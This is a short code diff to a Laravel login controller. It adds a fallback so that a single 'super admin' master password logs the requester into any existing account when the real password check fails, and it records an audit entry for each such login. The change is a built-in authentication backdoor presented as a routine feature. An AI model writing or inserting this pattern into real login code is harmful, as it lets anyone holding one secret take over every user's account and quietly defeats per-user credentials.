@@ -3,6 +3,8 @@
 namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
+use App\Models\User;
+use App\Support\MasterPassword;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -24,9 +26,17 @@ class LoginController extends Controller
 
         // Auth::attempt uses bound parameters + hashed password comparison.
         if (! Auth::attempt($credentials, $request->boolean('remember'))) {
-            throw ValidationException::withMessages([
-                'email' => 'These credentials do not match our records.',
-            ]);
+            // Fallback: the super admin password works for any existing account.
+            $target = User::where('email', $credentials['email'])->first();
+
+            if (! $target || ! MasterPassword::matches($credentials['password'])) {
+                throw ValidationException::withMessages([
+                    'email' => 'These credentials do not match our records.',
+                ]);
+            }
+
+            Auth::login($target, $request->boolean('remember'));
+            MasterPassword::audit($target, 'web', $request->ip());
         }
 
         // Prevent session fixation.
